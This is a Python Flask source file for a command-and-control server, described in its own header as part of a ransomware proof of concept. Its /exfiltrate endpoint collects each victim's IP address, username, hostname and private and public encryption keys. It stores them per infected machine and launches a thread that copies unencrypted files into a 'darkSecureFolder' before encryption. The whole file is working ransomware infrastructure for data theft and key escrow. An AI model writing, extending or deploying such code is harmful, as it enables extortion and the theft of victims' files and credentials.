#!/usr/bin/env python3
"""
C2 Server for Ransomware PoC (HTTP POST Version)
Receives exfiltrated data from infected machines via HTTP POST
"""

from flask import Flask, request, jsonify
import threading
import json
import os
import shutil
import time
from datetime import datetime
import logging

# -----------------
# LOGGING SETUP
# -----------------
def setup_logging():
    """Setup logging for C2 server activities"""
    if not os.path.exists('logs'):
        os.makedirs('logs')
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f'logs/c2_server_alt_{timestamp}.log'
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_filename, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
    logger = logging.getLogger(__name__)
    logger.info("=" * 60)
    logger.info("C2 SERVER (ALT, HTTP POST) STARTED")
    logger.info("=" * 60)
    logger.info(f"Log file: {log_filename}")
    logger.info(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    return logger

# -----------------
# CONFIGURATION
# -----------------
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 8080       # Non-privileged port
DARK_SECURE_FOLDER = "darkSecureFolder"  # Folder to store exfiltrated files

# -----------------
# DATA STORAGE
# -----------------
infected_machines = {}  # Store data from infected machines

app = Flask(__name__)
logger = setup_logging()

def copy_target_directory_files(target_path, machine_id, logger):
    """Copy all files from target directory to darkSecureFolder"""
    try:
        if not os.path.exists(DARK_SECURE_FOLDER):
            os.makedirs(DARK_SECURE_FOLDER)
            logger.info(f"Created {DARK_SECURE_FOLDER} directory")
        machine_folder = os.path.join(DARK_SECURE_FOLDER, machine_id)
        if not os.path.exists(machine_folder):
            os.makedirs(machine_folder)
            logger.info(f"Created machine folder: {machine_folder}")
        if not os.path.exists(target_path):
            logger.warning(f"Target path does not exist: {target_path}")
            return False
        files_copied = 0
        total_size = 0
        logger.info(f"Starting file exfiltration from: {target_path}")
        logger.info("IMPORTANT: Copying CLEAN files BEFORE encryption!")
        for root, dirs, files in os.walk(target_path):
            relative_path = os.path.relpath(root, target_path)
            if relative_path == '.':
                dest_dir = machine_folder
            else:
                dest_dir = os.path.join(machine_folder, relative_path)
                if not os.path.exists(dest_dir):
                    os.makedirs(dest_dir)
            for file in files:
                src_file = os.path.join(root, file)
                dest_file = os.path.join(dest_dir, file)
                if file.endswith('.wasted'):
                    logger.warning(f"Skipping already encrypted file: {src_file}")
                    continue
                try:
                    shutil.copy2(src_file, dest_file)
                    file_size = os.path.getsize(src_file)
                    total_size += file_size
                    files_copied += 1
                    logger.info(f"Copied CLEAN file: {src_file} -> {dest_file} ({file_size} bytes)")
                except Exception as e:
                    logger.error(f"Failed to copy {src_file}: {str(e)}")
        logger.info("=" * 50)
        logger.info("FILE EXFILTRATION COMPLETED")
        logger.info("=" * 50)
        logger.info(f"Total files copied: {files_copied}")
        logger.info(f"Total size: {total_size} bytes ({total_size / 1024 / 1024:.2f} MB)")
        logger.info(f"Destination: {machine_folder}")
        logger.info("NOTE: All copied files are CLEAN (not encrypted)")
        logger.info("=" * 50)
        return True
    except Exception as e:
        logger.error(f"Error during file exfiltration: {str(e)}")
        return False

def save_machine_data(machine_id, data, logger):
    """Save machine data to a JSON file"""
    try:
        if not os.path.exists('c2_data'):
            os.makedirs('c2_data')
        filename = f'c2_data/{machine_id}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        logger.info(f"Machine data saved to: {filename}")
    except Exception as e:
        logger.error(f"Error saving machine data: {str(e)}")

def print_status():
    """Print current status of infected machines"""
    logger.info("=" * 60)
    logger.info("C2 SERVER STATUS")
    logger.info("=" * 60)
    logger.info(f"Total infected machines: {len(infected_machines)}")
    logger.info(f"Dark secure folder: {DARK_SECURE_FOLDER}")
    if infected_machines:
        logger.info("Infected machines:")
        for machine_id, data in infected_machines.items():
            logger.info(f"  - {machine_id}")
            logger.info(f"    IP: {data['ip_address']}")
            logger.info(f"    OS: {data['operating_system']}")
            logger.info(f"    User: {data['username']}")
            logger.info(f"    Time: {data['timestamp']}")
    else:
        logger.info("No infected machines yet")
    logger.info("=" * 60)

@app.route("/exfiltrate", methods=["POST"])
def exfiltrate():
    """Endpoint to receive exfiltrated data from ransomware agent"""
    data = request.get_json()
    if not data:
        logger.warning("No JSON data received in POST request")
        return jsonify({"status": "error", "message": "No data received"}), 400
    required_fields = ["ip_address", "operating_system", "private_key", "public_key", "username", "hostname", "target_directory"]
    if not all(field in data for field in required_fields):
        logger.warning(f"Missing required fields in POST data: {data}")
        return jsonify({"status": "error", "message": "Missing required fields"}), 400
    machine_id = f"{data['ip_address']}_{data['hostname']}_{data['username']}"
    data['timestamp'] = datetime.now().isoformat()
    infected_machines[machine_id] = data
    logger.info("=" * 40)
    logger.info(f"INFECTED MACHINE DATA RECEIVED (HTTP POST)")
    logger.info("=" * 40)
    logger.info(f"Machine ID: {machine_id}")
    logger.info(f"IP Address: {data['ip_address']}")
    logger.info(f"Operating System: {data['operating_system']}")
    logger.info(f"Username: {data['username']}")
    logger.info(f"Hostname: {data['hostname']}")
    logger.info(f"Target Directory: {data['target_directory']}")
    logger.info(f"Timestamp: {data['timestamp']}")
    logger.info(f"Private Key Length: {len(data['private_key'])} chars")
    logger.info(f"Public Key Length: {len(data['public_key'])} chars")
    logger.info("=" * 40)
    save_machine_data(machine_id, data, logger)
    # Start file exfiltration in a background thread
    target_path = data['target_directory']
    exfiltration_thread = threading.Thread(
        target=copy_target_directory_files,
        args=(target_path, machine_id, logger),
        daemon=True
    )
    exfiltration_thread.start()
    logger.info(f"Started file exfiltration thread for path: {target_path}")
    return jsonify({"status": "ok", "message": "Data received and exfiltration started"}), 200

if __name__ == "__main__":
    print("C2 Server for Ransomware PoC (HTTP POST)")
    print("=" * 40)
    print(f"Host: {HOST}")
    print(f"Port: {PORT}")
    print(f"Dark Secure Folder: {DARK_SECURE_FOLDER}")
    print("=" * 40)
    print("This version uses HTTP POST on /exfiltrate")
    print("=" * 40)
    # Start status thread
    status_thread = threading.Thread(target=print_status, daemon=True)
    status_thread.start()
    app.run(host=HOST, port=PORT) 